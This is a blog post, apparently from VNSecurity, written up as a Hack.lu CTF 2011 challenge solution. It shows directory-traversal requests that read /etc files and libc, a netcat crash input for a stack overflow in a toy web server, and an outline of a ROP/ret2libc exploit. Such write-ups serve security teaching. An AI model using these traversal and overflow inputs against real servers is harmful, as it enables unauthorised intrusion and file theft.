@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>Hack.lu CTF 2011: Nebula Death Stick Services writeup</title>
+  <meta name="description" content="Challenge Information">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">Hack.lu CTF 2011: Nebula Death Stick Services writeup</h4>
+    <p class="post-meta">Oct 3, 2011 • longld</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="challenge-information">Challenge Information</h2>
+
+<blockquote>
+  <p>Death Sticks are a totally illegal drug in the universe.<br />
+However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.<br />
+Seems like nobody has the power to stop them, so the Galactic’s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service’s server and search for any evidence on how to take them down!<br />
+May the force be with you.</p>
+
+  <p>http://ctf.hack.lu:2010/</p>
+</blockquote>
+
+<h2 id="analysis">Analysis</h2>
+
+<p><em>Thanks rd for helping Analysis part.</em></p>
+
+<p>Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (<em>http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf</em>). Together with “<em>./a.out</em>” from HTTP response header, I managed to download the binary via this request <em>http://ctf.hack.lu:2010/?page=../a.out</em>.</p>
+
+<p>“<em>a.out</em>” binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.</p>
+
+<p><a href="/wp/storage/uploads/2011/10/parse_params.jpg"><img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" /></a></p>
+
+<p><strong>parse_params()</strong> function basically looks ‘<em>?</em>‘ and ‘<em>=</em>‘ in order to parse the input query such as <em>/?page=blah</em>, and then uses the different in length (<strong>len</strong>) to store parameter name and its value to the buffer on the stack of the caller function (<strong>handle_connection()</strong>). From above code, you can see that if we input in reverse order of ‘<em>?</em>‘ and ‘<em>=</em>‘ such as* /=blah?*, <strong>len</strong> value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.</p>
+
+<blockquote>
+  <p>$ python2 -c ‘print “GET /=” + “A”*60 + “? HTTP/”‘|nc -v localhost 2010<br />
+..<br />
+(gdb) run<br />
+Starting program: /home/jail/ctf/hack.lu/o500/a.out<br />
+Notice: Nebulaserv – A Webserver for Nebulacorp</p>
+
+  <p>Notice: Starting up!</p>
+
+  <ul>
+    <li>Accepting requests on port 2010<br />
+[New process 4626]  </li>
+    <li>
+      <p>Got request with length 0: 127.0.0.1:35695 – GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/</p>
+    </li>
+    <li>Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt; with value  </li>
+    <li>Opening ./nebula/index – 404 Not Found</li>
+  </ul>
+
+  <p>Program received signal SIGSEGV, Segmentation fault.<br />
+[Switching to process 4626]<br />
+0×41414141 in ?? ()</p>
+</blockquote>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as <em>system(“/tmp/sh”)</em>. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:</p>
+
+<h3 id="retrieve-libc">Retrieve libc</h3>
+
+<p>In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span></p>
+
+<h3 id="construct-rop-payload">Construct ROP payload</h3>
+
+<p>With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using “<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>” via <em>sprintf() – *which can perform byte-per-byte transfer the same as *strcpy() – *or “<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>“</em>. *</p>
+
+<h3 id="the-flag">The flag</h3>
+
+<p>The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver
+
+total 24
+
+-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out
+
+-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
+
+drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
+
+-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
+
+$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
+
+Flag: R0PPINGy0urWAYinDUDE
+
+</pre>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  $ ls -l /home/nebulaserver
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  total 24
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  Flag: R0PPINGy0urWAYinDUDE
+</div>
+
+<div id="_mcePaste" style="width: 1px;height: 1px">
+  $
+</div>
+
+<ul>
+  <li>*</li>
+</ul>
+
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
